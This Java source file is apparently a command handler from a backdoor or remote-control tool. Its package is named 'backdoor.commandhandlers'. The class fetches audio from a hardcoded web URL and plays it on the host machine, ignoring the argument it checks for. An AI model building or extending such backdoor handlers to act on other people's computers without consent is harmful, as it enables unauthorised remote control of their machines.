package net.jaguargaming.backdoor.commandhandlers;

import java.io.IOException;
import java.net.URL;

import javax.sound.sampled.AudioInputStream;
import javax.sound.sampled.AudioSystem;
import javax.sound.sampled.Clip;
import javax.sound.sampled.LineUnavailableException;
import javax.sound.sampled.UnsupportedAudioFileException;

public class CMDmusic {
	
	public static void handle(String[] args) throws IllegalArgumentException, UnsupportedAudioFileException, LineUnavailableException, IOException {
		if (args.length != 1) {
			throw new IllegalArgumentException("Wrong argument length");
		}
	    try {
	    	URL url = new URL("http://www.howjsay.com/index.php?word=car");
		    url.openConnection();
	    	Clip clip = AudioSystem.getClip();
			AudioInputStream ais = AudioSystem.getAudioInputStream(url);
			clip.open(ais);
			clip.start();
		} catch (UnsupportedAudioFileException e) {
			throw e;
		} catch (LineUnavailableException e) {
			throw e;
		} catch (IOException e) {
			throw e;
		}
	}
	
}
